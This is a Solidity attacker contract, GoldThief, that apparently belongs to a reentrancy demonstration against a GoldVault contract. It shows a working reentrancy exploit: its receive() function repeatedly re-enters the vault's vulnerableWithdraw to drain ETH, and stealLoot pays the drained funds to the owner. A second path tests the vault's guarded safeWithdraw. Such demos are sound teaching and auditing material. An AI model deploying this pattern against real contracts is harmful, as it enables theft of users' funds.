// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Interface to interact with the GoldVault contract.
interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}


contract GoldThief {
    IVault public targetVault;
    address public owner;
    uint public attackCount;
    bool public attackingSafe;

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    /**
     * @dev Initiates an attack on the vulnerable withdrawal function.
     */
    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value >= 1 ether, "Need at least 1 ETH to start attack");

        attackingSafe = false;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw();
    }

    /**
     * @dev Attempts to attack the secure withdrawal function to prove it works.
     */
    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value >= 1 ether, "Need at least 1 ETH to start attack");

        attackingSafe = true;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw(); // This call is expected to fail.
    }

    /**
     * @dev The core of the reentrancy attack. This function is automatically
     * triggered when the contract receives ETH.
     */
    receive() external payable {
        attackCount++;

        // If we are in "vulnerable" mode and there's still ETH in the vault, attack again.
        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.vulnerableWithdraw();
        }

        // If we are in "safe" mode, this re-entrant call will be blocked by the nonReentrant guard.
        if (attackingSafe) {
            targetVault.safeWithdraw(); 
        }
    }

    /**
     * @dev Allows the owner to withdraw the stolen funds.
     */
    function stealLoot() external {
        require(msg.sender == owner, "Only owner can withdraw loot");
        payable(owner).transfer(address(this).balance);
    }

    /**
     * @dev Checks the current ETH balance of this attacker contract.
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
